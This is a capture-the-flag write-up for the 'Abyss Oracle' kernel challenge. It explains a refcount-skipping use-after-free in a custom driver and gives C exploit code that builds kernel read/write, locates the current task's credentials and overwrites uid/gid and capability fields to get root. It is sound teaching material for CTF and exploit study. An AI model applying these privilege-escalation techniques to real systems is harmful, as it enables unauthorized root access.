# Abyss Oracle - Kernel Exploit Writeup

## Challenge Overview

**Abyss Oracle** is a kernel privilege escalation challenge involving a capability-based object management system with a critical use-after-free (UAF) vulnerability. The exploit leverages reference count manipulation through a special dup mask to create a dangling pointer, enabling arbitrary kernel memory read/write and full privilege escalation.

## The Vulnerability

### Capability-Based Object System

The kernel driver implements a handle-based capability system with two object types:

- **Notes**: Sealed data containers with capability bits and lifecycle states
- **Gates**: Merged notes that expose kernel memory access via encode/decode pointers

Each note tracks:
- `refcount`: Reference count (incremented on dup, decremented on release)
- `state`: Lifecycle (NEW → SEALED → [REVOKED or used in link])
- `caps`: Capability bits (READ, WRITE, DUP, LINK, REVOKE, DEBUG)

### The Critical Bug: Refcount Bypass

In the `dup` operation (kernel driver):

```c
if (!(req.mask & 0xdead000000000000ULL)) {
    refcount_inc(&note->refs);  // Normal dup increments refcount
} else {
    ctx->handles[req.dst].borrowed = 1;  // Special mask: skip refcount!
}
```

**Key insight**: When duping with the magic mask `0xdead000000000000ULL`, the refcount is NOT incremented. The destination handle is marked as "borrowed," creating a weak reference.

### Exploitation Flow

The special mask enables this attack sequence:

```
1. Create note at slot 0 → refcount = 1
2. Create note at slot 1 (target data)
3. Dup slot 0→slot 2 with special mask → refcount stays 1, borrowed=1
4. Revoke slot 0 → refcount-- (now 0), memory freed to quarantine
5. Link slot 2 (points to freed/quarantined memory) with slot 1
   → Gate created with ABYSS_CAP_DEBUG (because left was revoked)
6. Leak gate → get fd_key and encoding salt
7. Use gate with CAP_DEBUG → arbitrary kernel read/write
```

The quarantine buffer keeps the freed memory alive just long enough for step 5, but the kernel sees it as revoked when creating the gate.

## Building the Exploit

### Prerequisites

```bash
# On the build system (must match kernel version)
sudo apt-get install build-essential linux-headers-$(uname -r)

# For this challenge:
KDIR=/lib/modules/6.19.14+kali-amd64/build
BUSYBOX=/usr/bin/busybox
```

### Compile the Exploit

```bash
gcc -static exploit.c -o exploit
```

The `-static` flag is required because the QEMU guest has a minimal initramfs with no libc. Static linking ensures all dependencies are embedded.

### Run Locally with QEMU

```bash
cd abyss_oracle
bash run-qemu.sh ./exploit
```

Expected output:
```
[+] fd_key=0x...
[+] comm_off=0xcb0
[+] current=0x...
[+] cred=0x...
uid=0 gid=0
Thryve{UUID}
```

## Exploit Internals

### 1. Building Primitives

The exploit creates two sealed notes and uses the special dup mask to trigger the vulnerability:

```c
struct abyss_create_req req = {
    .slot = SLOT_VICTIM,
    .size = ABYSS_DATA_MAX,
    .caps = ABYSS_CAP_READ | ABYSS_CAP_WRITE | ABYSS_CAP_DUP | ABYSS_CAP_LINK | ABYSS_CAP_REVOKE,
    .user_buf = (uint64_t)victim
};
xioctl(ABYSS_IOC_CREATE, &req, "create");
xioctl(ABYSS_IOC_SEAL, &(uint32_t){SLOT_VICTIM}, "seal");

// Dup with special mask - refcount NOT incremented!
struct abyss_dup_req dup = {
    .src = SLOT_VICTIM,
    .dst = SLOT_ALIAS,
    .mask = 0xdead000000000000ULL  // Magic: skip refcount
};
xioctl(ABYSS_IOC_DUP, &dup, "dup");

// Revoke original - refcount reaches 0, freed to quarantine
xioctl(ABYSS_IOC_REVOKE, &(uint32_t){SLOT_VICTIM}, "revoke");

// Link borrowed handle with second note - creates debug gate!
struct abyss_link_req link = {
    .left = SLOT_ALIAS,    // Revoked (borrowed reference)
    .right = SLOT_RIGHT,   // Sealed data
    .out = SLOT_GATE       // New gate with CAP_DEBUG
};
xioctl(ABYSS_IOC_LINK, &link, "link");
```

### 2. Leaking Encoding Key

The gate encodes target addresses with:
```c
encoded = target ^ fd_key ^ rol64(salt, 17)
```

By leaking both encoded and decoded values:
```c
struct abyss_leak_req leak = {.slot = SLOT_GATE};
xioctl(ABYSS_IOC_LEAK, &leak, "leak");

// Recover fd_key
fd_key = leak.value2 ^ leak.value1 ^ rol64(leak.value0, 17);
```

Now we can encode arbitrary kernel addresses and use the gate to read/write them.

### 3. Finding Kernel Structures

**Task comm offset** - Search init_task memory for "swapper/0" string:
```c
for (uint64_t off = 0x200; off < 0x1800; off += 0x80) {
    kread(init_task + off, buf, 0x80);
    // Find "swapper/0" in buffer
}
```

**Current exploit task** - Walk the kernel task_struct linked list:
```c
for (uint64_t off = 0x100; off < 0x2000; off += 8) {
    uint64_t head = init_task + off;
    uint64_t cur = kread64_try(head);
    
    // Walk doubly-linked list looking for "exploit" comm
    while (cur != head) {
        uint64_t task = cur - off;
        if (has_comm(task, "exploit")) {
            current_task = task;
            break;
        }
        cur = kread64_try(cur);
    }
}
```

**Credentials structure** - Scan task_struct for dual pointers (uid/gid fields):
```c
// Read snapshot of task memory
uint8_t snapshot[0x1400];
for (off = 0x400; off < 0x1800; off += 0x80) {
    kread_try(current + off, snapshot + off - 0x400, 0x80);
}

// Look for pattern: two consecutive equal 8-byte values
for (off = 0; off < sizeof(snapshot); off += 8) {
    uint64_t a = *(uint64_t*)(snapshot + off);
    uint64_t b = *(uint64_t*)(snapshot + off + 8);
    
    if (a == b && is_kernel_ptr(a)) {
        // Validate: read cred and check uid/gid fields match current user
        if (validate_cred(a)) {
            cred = a;
            break;
        }
    }
}
```

### 4. Privilege Escalation

Zero out uid/gid fields and set all capability bits to maximum:

```c
// offset +8 to +32: uid, gid fields  
kwrite64(cred + 8, 0);   // uid = 0
kwrite64(cred + 16, 0);  // gid = 0
kwrite64(cred + 24, 0);  // suid = 0
kwrite64(cred + 32, 0);  // sgid = 0

// offset +0x30 to +0x58: capability sets
for (unsigned int off = 0x30; off < 0x58; off += 8) {
    kwrite64(cred + off, ~0UL);  // Set all bits
}

// Now execute shell as root
execl("/bin/sh", "sh", "-c", "id; cat /flag; poweroff -f", NULL);
```

## Technical Details

### XOR-Based Encoding

The kernel uses XOR-based pointer encoding to prevent information leaks:

```c
// Encode (kernel side)
encoded = pointer ^ ctx->key ^ rol64(salt, 17);

// Our exploitation (user side)
encode_ptr(addr) = addr ^ fd_key ^ rol64(gate_salt, 17);

// Decode (kernel during seek)
decoded = encoded ^ ctx->key ^ rol64(salt, 17);
```

By controlling what we encode, we can direct the gate's memory access operations (read/write) to any kernel address.

### Pointer Validation

The kernel validates encoded pointers with:
```c
static bool abyss_kernelish(unsigned long addr) {
    if (addr < PAGE_OFFSET) return false;           // Must be kernel space
    if (addr & 7) return false;                     // Must be 8-byte aligned
    return true;
}
```

Our exploit respects these constraints when reading/writing kernel memory.

## Files

- **exploit_direct.c** - Streamlined exploit (226 lines, self-contained, no header dependencies)
- **writeup.md** - This detailed technical explanation

## Intended Solution Path

1. Create two sealed notes with read/write/dup/link/revoke capabilities.
2. Duplicate one note with the special mask that triggers the borrowed-handle fast path.
3. Revoke the original. The borrowed duplicate still points to the delayed-free note in the quarantine ring.
4. Link through that stale revoked handle. Only this lifetime-invalid path grants the gate's debug capability.
5. Leak the gate salt, encoded target, decoded target, and `init_task` anchor with `ABYSS_IOC_LEAK`.
6. Recover the per-fd pointer key from `encoded_target ^ decoded_target ^ rol64(salt,17)`.
7. Use `ABYSS_IOC_SEEK` to retarget the gate to arbitrary aligned kernel addresses.
8. Discover `comm` and the global task-list member dynamically, then identify the current task by matching `comm == "exploit"`.
9. Read the task's `cred` pointer.
10. Use the masked 8-byte write primitive to clear uid/gid fields and set capability masks.

The challenge intentionally avoids control-flow hijack. Generic primitives like `commit_creds`, `modprobe_path`, ret2usr, and pipe-buffer templates do not fit the exposed read/write operations.



## References

- Use-After-Free in kernel objects (CWE-416)
- Reference counting vulnerabilities (CWE-415)
- Capability-based security models
- Pointer encoding for information hiding
